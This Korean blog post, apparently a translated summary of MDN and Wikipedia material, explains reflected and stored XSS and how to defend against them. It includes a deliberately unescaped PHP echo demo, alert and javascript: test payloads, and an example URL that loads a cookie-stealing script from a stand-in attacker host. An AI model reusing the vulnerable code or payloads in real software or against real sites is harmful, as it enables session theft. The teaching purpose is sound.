---
layout: post
title: 웹 보안 01. XSS 공격
category: etc
subtitle: 웹 보안에 대한 개념과 웹 보안을 위협하는 가장 흔한 방법인 XSS 공격에 대해 알아봅시다.
date: 2018-05-22
---

해당 글은 <a href="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/Fetching_data" target="_blank">MDN: Web Security</a>를 번역 및 요약한 글임을 밝힙니다.

웹 보안은 웹의 사용성과 디자인 등 모든 측면에 대해 안정성을 요구합니다. 아래 글은 웹 보안에 대한 전문적인 내용을 다루지는 않지만, 웹 어플리케이션을 취약점과 그로부터 보완할 수 있는 방법에 대해 소개합니다.

## 웹 보안이란 무엇인가?
인터넷은 생각보다 위험한 공간입니다. 웹 공격으로 인해 계정, 비밀번호, 카드번호 등은 공용 도메인으로 쉽게 유출되고 개인적인, 경제적인 위험에 빠질 위험이 높습니다. 웹 보안은 허가되지 않은 접근(unauthorized access), 데이터 변형(modification), 데이터 파괴(destruction), 데이터 전송 중단(disruption) 등을 사전에 방지하는 것을 목표로 두고 있습니다.

효과적인 웹 보안은 웹 사이트를 전체적으로 설계하는데부터 시작합니다. 여기엔 웹 서버의 설정, 비밀번호 생성 및 변경 정책 등 모든 것이 포함됩니다. 기술적으로 어렵게 들릴 수 있으나, 이미 서버사이드 렌더링 방식을 사용하고 있다면 웬만한 공격은 기본적으로 자동 방어됩니다. 또한 HTTP가 아닌, HTTPS를 사용함으로써 또 다른 공격들도 어느정도 커버됩니다. 혹시 놓치는 점이 없는지 웹 보안성을 테스트할 수 있는 여러 툴도 존재해 보다 안전하게 웹 사이트를 운영할 수 있습니다. 

이번 `웹 보안` 시리즈에서는 웹 보안을 위협하는 요소들과 간단한 대처방안에 대해 기술합니다.

## Cross-Site Scripting(XSS)
Cross-Site Scripting(이하 XSS)는 공격자가 유저의 브라우저에 악성 스크립트를 삽입해 실행되게 만드는 공격을 일컫는 용어로 가장 널리 알려진 공격 방법입니다. 예를 들어, XSS 공격을 통해 사용자 브라우저에 인증 정보가 담겨있는 쿠키를 공격자에게 전송하는 악성 스크립트 심을 수 있습다. 공격자가 쿠키를 얻게 되면, 그에 담긴 인증정보로 웹 사이트에 마치 사용자인것처럼 행동해 로그인할 수 있습니다. 또한 사용자의 카드정보 및 연락처 등이 노출될 수도 있습니다. XSS 공격 방식에는 크게 두 가지가 있습니다.

### 1. Reflected(non-persistent) XSS
Reflected XSS 공격은 유저가 입력한 내용이 쿼리의 형태로 서버로 전달될 때 악성코드를 함께 실어 보내는 방식입니다. 아래 간단한 예제를 통해 자세히 확인해봅니다.

{% highlight html linenos %}
<html>
  <head></head>
  <body>
    <form action="./action.php" method="get">
      이름: <input type="text" name="username"> 
      <input type="submit">
    </form>
  </body>
</html>
{% endhighlight %}<span class="expl">[example/index.html]</span>

{% highlight html linenos %}
<html>
  <head></head>
  <body>
    이름: <?php echo $_GET['username'] ?>
  </body>
</html>
{% endhighlight %}<span class="expl">[example/action.php]</span>


example이라는 폴더를 만들고 index.html 파일과 action.php 파일을 만든 후, 아래 코드를 입력해 저장합니다. index.html 파일을 브라우저에 띄워보면 아래와 같은 화면을 볼 수 있습니다. 

![]({{ "/img/etc/web-security-01.png" | absolute_url }})

action.php 파일의 코드가 동작하기 위해서는 php 웹 서버를 띄워야 합니다.  

<pre class="pre-blue">
  1. cd ~/Desktop/example 터미널을 열고 example 폴더가 있는 곳으로 이동한다. 
  2. php -S localhost:8000  포트번호 8000번(이미 사용중이면 다른 것으로 대체가능)으로 php 웹 서버에 접속한다.
  3. 브라우저 창을 열고 주소창에 localhost:8000을 입력한다.
</pre>

자 이제 php 웹 서버에 example 프로젝트를 띄웠습니다. input값에 이름을 `홍길동`으로 입력하고 오른쪽에 위치한 제출 버튼을 눌러봅니다. `이름: 홍길동`으로 잘 바뀌는 것을 확인할 수 있습니다. url도 `localhost:8000/action.php?username=홍길동`으로 변경됩니다.

이번엔 input 값에 `<script>alert('hello')</script>`를 입력한 후 제출 버튼을 눌러봅니다. 크롬 브라우저를 사용하고 있다면 아래와 같은 화면이 나옵니다.

![]({{ "/img/etc/web-security-02.png" | absolute_url }})<span class="expl">[크롬 브라우저에서 XSS 공격이 차단된 모습]</span>

XSS 공격에 대비해 브라우저가 input값에 `<script>`, `<object>`, `<embed>`, `<link>` 등의 태그가 들어가는 것을 사전에 차단(더 정확하게 말하자면, url에 해당 태그가 들어가는 것을 차단)합니다. 하지만 파이어폭스에서는 로컬 서버여서 그런건지 아래 그림처럼 input값이 제대로 sanitize되지 않아 제출 버튼을 누르면 hello라는 메시지를 띄우는 alert 창이 나타나는 것을 확인할 수 있습니다.

![]({{ "/img/etc/web-security-03.png" | absolute_url }})<span class="expl">[파이어폭스 브라우저에서 XSS 공격이 차단되지 못한 모습]</span>

보다 자세한 시나리오를 위키피디아가 <a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent" target="_blank">Cross-site scripting: Exploit Examples</a>라는 항목으로 따로 정리하고 있습니다. 내용이 좋아 번역 및 요약해보았습니다. 

1. 앨리스는 종종 밥의 웹 사이트(`http://bobssite.org`)를 방문하곤 한다. 밥의 웹 사이트는 이름과 비밀번호로 로그인이 가능하며 카드정보 등을 갖고 있다. 유저가 로그인을 하면 브라우저는 인증 쿠키를 갖고 있기 때문에 클라이언트와 서버 모두 로그인 여부를 알 수 있는 구조로 되어있다.

2. 말로리는 reflected XSS 방법으로 밥의 웹 사이트를 공격하려 하고있다.

* 2-1. 밥의 웹 사이트에는 검색을 할 수 있는 페이지가 있다. 검색 페이지에서 키워드를 입력하고 제출 버튼을 눌렀을때 만약 검색 결과가 없으면 `not found`라는 메시지가 출력되고 url은 `http://bobssite.org?q=her search term`로 변경된다고 가정해보자.

* 2-2. `dogs`라는 키워드를 입력하고 제출 버튼을 누르면 url은 `http://bosssite.org?q=dogs`로 변경되고 `dogs not found`라는 내용이 출력된다. 정상적인 동작이다.

* 2-3. 하지만 말로리가 앙심을 품고 검색 창에 `<script type="text/javascipt">alert('xss');</script>`를 입력하고 제출 버튼을 누른다면 어떻게 될까? xss라는 메시지가 표시되는 alert창이 나타나고 `<script type="text/javascipt">alert('xss');</script> not found`라는 내용이 출력된다. 물론 url은 `http://bosssite:org/?q=<script type="text/javascipt">alert('xss');</script>`가 된다.

{:start="3"}
3. 말로리가 이번엔 더 큰 앙심을 품어 다른 사람의 정보를 빼내려고 한다. 

* 3-1. 그녀는 `http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>` 이러한 URL을 만들었다.

* 3-2. 사용자가 눈치챌 수 있으니 인코딩 과정을 거쳐 `http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E`라는 URL을 얻었다.

* 3-3. `귀여운 강아지 사진 보기`등의 버튼이 담긴 메일을 보낸다. 

{:start="4"}
4. 앨리스는 해당 메일을 받고 `귀여운 강아지 사진 보기` 버튼을 눌렀고 밥의 웹 사이트 내부 검색 페이지로 이동되는 것을 확인했다. `dogs not found`라는 메시지를 확인한 동시에 말로리가 만든 악성 스크립트는 실행되고 말았다. 하지만 앨리스는 그 사실을 모른다. 

5. 해당 악성 스크립트는 앨리스 브라우저에서 동작해 인증 쿠키를 복사하고 말로리의 서버로 전송한다. 앨리스의 인증 정보가 담긴 쿠키를 받은 말로리는 밥의 웹 사이트에 마치 그녀가 앨리스인것처럼 로그인을 하고 카드정보를 빼간다. 

reflected XSS 공격은 아래와 같은 방법으로 어느정도 완화시킬 수 있습니다.

```
- input값을 sanitize 한다.
- 유효하지 않은 요청에 대해서는 리다이렉션 시킨다.
- 동시에 다른 기기 또는 다른 IP에서 로그인 되는 상황을 감지하고 세션을 만료시킨다.
- 로그인이 되었다고 하더라도, 카드 정보 등 금융정보는 일부만 노출시킨다.
- 사용자 정보를 바꿀때에는 비밀번호를 재입력받는다.
- 쿠키를 만들때 클라이언트에서의 접근을 막기 위해 HTTP response 헤더에 `HttpOnly` 플래그를 추가한다.
```


### 2. Stored(persistent) XSS
Persistent XSS 공격은 악성 스크립트가 웹 사이트 내부 코드에 숨겨져(stored)있다가 공격자가 원하는 순간 자동으로 동작해 사용자도 모르는 사이에 인증 정보 등을 빼가는 방식입니다.

가장 흔한 예시로 게시판이 있습니다. 게시판에 글을 작성할때, 악성 스크립트 코드를 포함시킨다면 어떻게 될까요? 사용자가 공격자가 작성한 글에 접근하는 순간, 악성코드가 자동으로 실행됩니다. 결국 악성코드는 해당 웹사이트에 `내재되어` 있다가 특정 순간에 실행되는 셈입니다. reflected XSS 공격처럼 특정 타겟을 지정하거나 타겟이 어떠한 행동을 하도록 유도하지 않고서도 공격이 가능하기 때문에 보다 주의가 요구됩니다.


## XSS 공격을 대비하기 위한 방법
### 1. 문자열 input에 대한 encoding/escaping
XSS 공격에 대비하기 위한 가장 기본적인 방법이 encoding과 escaping 입니다. 여기엔 JS escaping, CSS escaping 그리고 URL encoding 등이 포함됩니다. 많은 데이터를 요하지 않는 어플리케이션이라면 위 방법으로도 충분히 XSS 공격에 대비할 수 있지만 완벽하지 않습니다.

### 2. 신뢰할 수 없는 HTML input에 대한 안전성 검사
유저로부터 HTML 마크업 입력을 허용하는 웹앱들이 있습니다. 때문에 `<b>very</b> large`를 입력하면 `<b>very</b> large`가 아닌, <b>very</b> large가 출력되는 것입니다. 하지만 신뢰할 수 없는 HTML input에 대해서는 XSS 공격을 방지하기 위해 `HTML sanitization` 엔진으로 유효성 검사를 해야합니다. 이로써 `<script>`, `<link>`, `<iframe>`등을 입력하는 행위가 차단됩니다. 하지만 대부분의 경우 무해히다고 볼 수 있는 이미지 태그조차 아래와 같이 사용되면 XSS 공격을 완벽히 차단한다고 볼 수 없습니다.

```<img src="javascript:alert(1)">```

### 3. 쿠키를 이용한 보안
컨텐츠를 필터링하는것보다 더욱 강력한 방법은 쿠키를 통해 인증하는 것입니다. 대부분의 웹 어플리케이션은 세션 쿠키를 통해 HTTP 요청간 인증을 처리하는데, XSS 공격에 의해 쿠키가 노출된다면 보안에 큰 문제가 발생하게 됩니다.

세션 쿠키를 로그인한 유저의 IP와 묶어서 인증여부를 검사한다면 보다 안전합니다. 공격자가 사용자의 쿠키를 얻었다고 하더라도, IP가 다르기 때문에 인증에 실패하기 때문입니다. 하지만 공격자가 프록시 웹 서버를 통해 사용자의 IP와 같은 IP로 접속한다면 인증에 성공하게 됩니다.

따라서 앞서 설명한 바와 같이 쿠키를 만들때 `HttpOnly` 플래그를 추가해 클라이언트 스크립트를 통해 쿠키에 접근할 수 없도록 막아야 합니다. `HttpOnly` 플래그는 IE(버전 6 이상), Firefox(q버전 2.0.0.5 이상), Safari(버전 4 이상), Opera(버전 9.5 이상), 크롬에서 모두 지원합니다.

이 외에도 많은 유형의 XSS 공격과 그에 따른 방지책이 존재합니다. 다음 글에서는 SQL injection 공격에 대해 알아보겠습니다.

## 참고링크(Reference)
<a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/First_steps/Website_security" target="_blank">MDN: Web Security</a>

<a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank">Wikipedia: Cross-site scripting</a>

<a href="https://www.owasp.org/index.php/HttpOnly" target="_blank">OWASP: HttpOnly</a>